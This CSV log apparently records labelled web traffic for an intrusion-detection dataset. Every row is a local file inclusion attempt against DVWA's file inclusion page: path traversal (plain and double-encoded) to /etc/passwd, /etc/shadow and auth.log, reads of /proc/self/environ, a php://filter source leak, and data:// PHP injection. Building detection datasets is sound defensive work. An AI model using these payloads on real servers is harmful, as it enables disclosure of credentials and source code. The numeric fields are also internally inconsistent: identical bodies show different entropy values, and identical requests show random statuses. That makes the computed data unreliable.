timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-12-24T06:57:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.121,13,4,22,0,500,4396
2025-12-24T06:58:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,3.823,3,4,18,0,500,2773
2025-12-24T06:58:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.22,13,4,24,0,500,2555
2025-12-24T06:58:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.217,10,4,35,0,500,1800
2025-12-24T06:58:22Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.422,10,4,19,0,403,1298
2025-12-24T06:58:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.155,3,4,18,0,403,729
2025-12-24T06:58:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,5.063,10,4,19,0,403,3567
2025-12-24T06:58:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.809,13,4,22,0,200,2024
2025-12-24T06:58:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.437,13,4,22,0,500,4569
2025-12-24T06:58:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.935,9,4,53,0,200,2814
2025-12-24T06:58:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.177,10,4,27,0,200,4053
2025-12-24T06:59:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.219,9,4,53,0,500,4357
2025-12-24T06:59:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,5.919,3,4,18,0,200,860
2025-12-24T06:59:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,5.291,10,4,27,0,403,4354
2025-12-24T06:59:22Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.742,13,4,36,0,500,3033
2025-12-24T06:59:28Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,4.083,13,4,36,0,500,2175
2025-12-24T06:59:34Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,5.843,13,4,36,0,403,4043
2025-12-24T06:59:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,4.206,3,4,18,0,403,3345
2025-12-24T06:59:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,3.887,3,4,18,0,200,2834
2025-12-24T06:59:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=/proc/self/environ,/dvwa/vulnerabilities/fi/,/proc/self/environ,18,3.953,3,4,18,0,200,1711
2025-12-24T06:59:58Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../proc/version,/dvwa/vulnerabilities/fi/,../../../../proc/version,24,4.768,13,4,24,0,500,434
2025-12-24T07:00:04Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd,/dvwa/vulnerabilities/fi/,..%2f..%2f..%2fetc%2fpasswd,27,4.977,10,4,27,0,200,570
2025-12-24T07:00:10Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd,/dvwa/vulnerabilities/fi/,..%252f..%252f..%252fetc%252fpasswd,35,4.412,10,4,35,0,403,2542
2025-12-24T07:00:16Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,4.662,9,4,53,0,500,303
2025-12-24T07:00:22Z,"('127.0.0.1', 35990)",GET,"http://192.168.122.170/dvwa/vulnerabilities/fi/?page=data://text/plain,<?php phpinfo();?>",/dvwa/vulnerabilities/fi/,"data://text/plain,<?php phpinfo();?>",36,3.924,13,4,36,0,500,4467
2025-12-24T07:00:28Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php,/dvwa/vulnerabilities/fi/,php://filter/convert.base64-encode/resource=index.php,53,5.666,9,4,53,0,500,957
2025-12-24T07:00:34Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../var/log/auth.log,/dvwa/vulnerabilities/fi/,../../../../var/log/auth.log,28,5.075,15,4,28,0,200,1750
2025-12-24T07:00:40Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,4.402,13,4,22,0,403,2434
2025-12-24T07:00:46Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../etc/shadow,/dvwa/vulnerabilities/fi/,../../../etc/shadow,19,4.712,10,4,19,0,500,1590
2025-12-24T07:00:52Z,"('127.0.0.1', 35990)",GET,http://192.168.122.170/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd,/dvwa/vulnerabilities/fi/,../../../../etc/passwd,22,5.215,13,4,22,0,403,3380
